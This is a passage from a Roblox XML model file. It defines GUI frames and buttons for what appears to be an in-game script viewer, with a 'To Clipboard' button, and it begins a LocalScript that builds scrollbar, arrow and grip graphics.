								<float name="BackgroundTransparency">0</float>
								<Color3 name="BorderColor3">4287993237</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<Content name="Image"><null></null></Content>
								<Color3 name="ImageColor3">4294967295</Color3>
								<Vector2 name="ImageRectOffset">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Vector2 name="ImageRectSize">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<float name="ImageTransparency">0</float>
								<bool name="Modal">false</bool>
								<string name="Name">ScriptBarLeft</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>1</XS>
									<XO>-32</XO>
									<YS>0</YS>
									<YO>40</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<token name="ScaleType">0</token>
								<bool name="Selectable">true</bool>
								<bool name="Selected">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>16</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<Rect2D name="SliceCenter">
									<min>
										<X>0</X>
										<Y>0</Y>
									</min>
									<max>
										<X>0</X>
										<Y>0</Y>
									</max>
								</Rect2D>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBXA61EE6015BB84FEFAE98E38BA75798C7">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Arrow Graphic</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0.5</XS>
										<XO>-4</XO>
										<YS>0.5</YS>
										<YO>-4</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>8</XO>
										<YS>0</YS>
										<YO>8</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBXE16924606235412FAD24A85C4E148C03">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4287993237</Color3>
										<float name="BackgroundTransparency">0.699999988</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Graphic</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0.25</XS>
											<XO>0</XO>
											<YS>0.375</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0.125</XS>
											<XO>0</XO>
											<YS>0.25</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX290C3F83C6914DD68E3A39D108ADE020">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4287993237</Color3>
										<float name="BackgroundTransparency">0.699999988</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Graphic</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0.375</XS>
											<XO>0</XO>
											<YS>0.25</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0.125</XS>
											<XO>0</XO>
											<YS>0.5</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX617436B973D24DF69C73B1D0679CBA74">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4287993237</Color3>
										<float name="BackgroundTransparency">0.699999988</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Graphic</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0.5</XS>
											<XO>0</XO>
											<YS>0.125</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0.125</XS>
											<XO>0</XO>
											<YS>0.75</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX28F7F31D465342038690B8F992A46744">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4287993237</Color3>
										<float name="BackgroundTransparency">0.699999988</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Graphic</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0.625</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0.125</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
						</Item>
						<Item class="ImageButton" referent="RBX61AEEAEB08F84D15B6165DAB688A0C81">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<bool name="AutoButtonColor">false</bool>
								<Color3 name="BackgroundColor3">4292730333</Color3>
								<float name="BackgroundTransparency">0</float>
								<Color3 name="BorderColor3">4287993237</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<Content name="Image"><null></null></Content>
								<Color3 name="ImageColor3">4294967295</Color3>
								<Vector2 name="ImageRectOffset">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Vector2 name="ImageRectSize">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<float name="ImageTransparency">0</float>
								<bool name="Modal">false</bool>
								<string name="Name">ScriptBarRight</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>1</XS>
									<XO>-16</XO>
									<YS>0</YS>
									<YO>40</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<token name="ScaleType">0</token>
								<bool name="Selectable">true</bool>
								<bool name="Selected">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>16</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<Rect2D name="SliceCenter">
									<min>
										<X>0</X>
										<Y>0</Y>
									</min>
									<max>
										<X>0</X>
										<Y>0</Y>
									</max>
								</Rect2D>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBX4EE7A0299FF143BFB98BB0915795A013">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Arrow Graphic</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0.5</XS>
										<XO>-4</XO>
										<YS>0.5</YS>
										<YO>-4</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>8</XO>
										<YS>0</YS>
										<YO>8</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBXDCC58D0D689E47878B2F9B34AB848D51">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4287993237</Color3>
										<float name="BackgroundTransparency">0.699999988</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Graphic</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0.625</XS>
											<XO>0</XO>
											<YS>0.375</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0.125</XS>
											<XO>0</XO>
											<YS>0.25</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXF793662A1CC8495EA73A462B724F10E1">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4287993237</Color3>
										<float name="BackgroundTransparency">0.699999988</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Graphic</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0.5</XS>
											<XO>0</XO>
											<YS>0.25</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0.125</XS>
											<XO>0</XO>
											<YS>0.5</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXB946C2832D174B8AB0B649A84D062546">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4287993237</Color3>
										<float name="BackgroundTransparency">0.699999988</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Graphic</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0.375</XS>
											<XO>0</XO>
											<YS>0.125</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0.125</XS>
											<XO>0</XO>
											<YS>0.75</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXF3149B96447C4F64AE02DB9140778CAE">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4287993237</Color3>
										<float name="BackgroundTransparency">0.699999988</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Graphic</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0.25</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0.125</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
						</Item>
						<Item class="TextButton" referent="RBXA9B46541FD5D4407A3E07E9BFEF1165E">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<bool name="AutoButtonColor">true</bool>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">0.5</float>
								<Color3 name="BorderColor3">4278190080</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">5</token>
								<bool name="Modal">false</bool>
								<string name="Name">Clipboard</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">true</bool>
								<bool name="Selected">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>80</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<string name="Text">To Clipboard</string>
								<Color3 name="TextColor3">4279970357</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">14</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">2</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
						<Item class="Frame" referent="RBXBDF7ADC02301456DA195E5C8914A8501">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4292006610</Color3>
								<float name="BackgroundTransparency">0</float>
								<Color3 name="BorderColor3">4287993237</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">true</bool>
								<bool name="Draggable">false</bool>
								<string name="Name">ScriptBar</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>40</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>-32</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
						<Item class="Frame" referent="RBX5EFA288EA7124B4DB73A4CEA273DF4C5">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<string name="Name">Entry</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>100</XO>
									<YS>1</YS>
									<YO>0</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">false</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="TextButton" referent="RBXAB20B6FC675542578B54C7AD96C91E66">
								<Properties>
									<bool name="Active">true</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<bool name="AutoButtonColor">true</bool>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">0.600000024</float>
									<Color3 name="BorderColor3">4278190080</Color3>
									<int name="BorderSizePixel">1</int>
									<bool name="ClipsDescendants">true</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">4</token>
									<bool name="Modal">false</bool>
									<string name="Name">Button</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">true</bool>
									<bool name="Selected">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>1</YS>
										<YO>0</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<string name="Text"></string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">12</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">0</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">4</int>
								</Properties>
							</Item>
							<Item class="TextButton" referent="RBXDEEB451C134C4B5BAA418F0A8773B533">
								<Properties>
									<bool name="Active">true</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<bool name="AutoButtonColor">true</bool>
									<Color3 name="BackgroundColor3">4294967295</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4278190080</Color3>
									<int name="BorderSizePixel">1</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">5</token>
									<bool name="Modal">false</bool>
									<string name="Name">Close</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>1</XS>
										<XO>-20</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">true</bool>
									<bool name="Selected">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>20</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<string name="Text">X</string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">14</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">4</int>
								</Properties>
							</Item>
						</Item>
					</Item>
					<Item class="BindableEvent" referent="RBXBDA8D30F55CC4168A8180DAEB77B3106">
						<Properties>
							<string name="Name">OpenScript</string>
						</Properties>
					</Item>
					<Item class="LocalScript" referent="RBXD150C6A80B90404AAD3D494E2502E502">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">LocalScript</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[local top = script.Parent

local editorGrid = top:WaitForChild("EditorGrid")

local currentSource = ""

local currentEditor = {
	x = 0,
	y = 0
}

local userInput = game:GetService("UserInputService")
local mouse = game.Players.LocalPlayer:GetMouse()

local topBar = top:WaitForChild("TopBar")
local scriptBar = topBar:WaitForChild("ScriptBar")
local scriptBarLeft = topBar:WaitForChild("ScriptBarLeft")
local scriptBarRight = topBar:WaitForChild("ScriptBarRight")
local clipboardButton = topBar:WaitForChild("Clipboard")

local entryTemplate = topBar:WaitForChild("Entry")

local openEvent = top:WaitForChild("OpenScript")

local closeButton = top:WaitForChild("Close")

local memoryScripts = {}

local editingIndex = 0

-- Scrollbar

local ScrollBarWidth = 16

local ScrollStyles = {
	Background      = Color3.new(233/255, 233/255, 233/255);
	Border          = Color3.new(149/255, 149/255, 149/255);
	Selected        = Color3.new( 63/255, 119/255, 189/255);
	BorderSelected  = Color3.new( 55/255, 106/255, 167/255);
	Text            = Color3.new(  0/255,   0/255,   0/255);
	TextDisabled    = Color3.new(128/255, 128/255, 128/255);
	TextSelected    = Color3.new(255/255, 255/255, 255/255);
	Button          = Color3.new(221/255, 221/255, 221/255);
	ButtonBorder    = Color3.new(149/255, 149/255, 149/255);
	ButtonSelected  = Color3.new(255/255,   0/255,   0/255);
	Field           = Color3.new(255/255, 255/255, 255/255);
	FieldBorder     = Color3.new(191/255, 191/255, 191/255);
	TitleBackground = Color3.new(178/255, 178/255, 178/255);
}
do
	local ZIndexLock = {}
	function SetZIndex(object,z)
		if not ZIndexLock[object] then
			ZIndexLock[object] = true
			if object:IsA'GuiObject' then
				object.ZIndex = z
			end
			local children = object:GetChildren()
			for i = 1,#children do
				SetZIndex(children[i],z)
			end
			ZIndexLock[object] = nil
		end
	end
end
function SetZIndexOnChanged(object)
	return object.Changed:connect(function(p)
		if p == "ZIndex" then
			SetZIndex(object,object.ZIndex)
		end
	end)
end
function Create(ty,data)
	local obj
	if type(ty) == 'string' then
		obj = Instance.new(ty)
	else
		obj = ty
	end
	for k, v in pairs(data) do
		if type(k) == 'number' then
			v.Parent = obj
		else
			obj[k] = v
		end
	end
	return obj
end
-- returns the ascendant ScreenGui of an object
function GetScreen(screen)
	if screen == nil then return nil end
	while not screen:IsA("ScreenGui") do
		screen = screen.Parent
		if screen == nil then return nil end
	end
	return screen
end
-- AutoButtonColor doesn't always reset properly
function ResetButtonColor(button)
	local active = button.Active
	button.Active = not active
	button.Active = active
end

function ArrowGraphic(size,dir,scaled,template)
	local Frame = Create('Frame',{
		Name = "Arrow Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size,0,size);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	local transform
	if dir == nil or dir == 'Up' then
		function transform(p,s) return p,s end
	elseif dir == 'Down' then
		function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
	elseif dir == 'Left' then
		function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	elseif dir == 'Right' then
		function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	end

	local scale
	if scaled then
		function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
	else
		function scale(p,s) return p,s end
	end

	local o = math.floor(size/4)
	if size%2 == 0 then
		local n = size/2-1
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,(i+1)*2,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	else
		local n = (size-1)/2
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,i*2+1,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	end
	if size%4 > 1 then
		local t = template:Clone()
		local p,s = scale(transform(
			UDim2.new(0,0,0,size-o-1),
			UDim2.new(0,size,0,1)
		))
		t.Position = p
		t.Size = s
		t.Parent = Frame
	end
	return Frame
end

function GripGraphic(size,dir,spacing,scaled,template)
	local Frame = Create('Frame',{
		Name = "Grip Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size.x,0,size.y);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	spacing = spacing or 2

	local scale
	if scaled then
		function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
	else
		function scale(p) return p end
	end

	if dir == 'Vertical' then
		for i=0,size.x-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,1,0,size.y))
			t.Position = scale(UDim2.new(0,i,0,0))
			t.Parent = Frame
		end
	elseif dir == nil or dir == 'Horizontal' then
		for i=0,size.y-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,size.x,0,1))
			t.Position = scale(UDim2.new(0,0,0,i))
			t.Parent = Frame
		end
	end

	return Frame
end

do
	local mt = {
		__index = {
			GetScrollPercent = function(self)
				return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
			end;
			CanScrollDown = function(self)
				return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
			end;
			CanScrollUp = function(self)
				return self.ScrollIndex > 0
			end;
			ScrollDown = function(self)
				self.ScrollIndex = self.ScrollIndex + self.PageIncrement
				self:Update()
			end;
			ScrollUp = function(self)
				self.ScrollIndex = self.ScrollIndex - self.PageIncrement
				self:Update()
			end;
			ScrollTo = function(self,index)
				self.ScrollIndex = index
				self:Update()
			end;
			SetScrollPercent = function(self,percent)
				self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
				self:Update()
			end;
		};
	}
	mt.__index.CanScrollRight = mt.__index.CanScrollDown
	mt.__index.CanScrollLeft = mt.__index.CanScrollUp
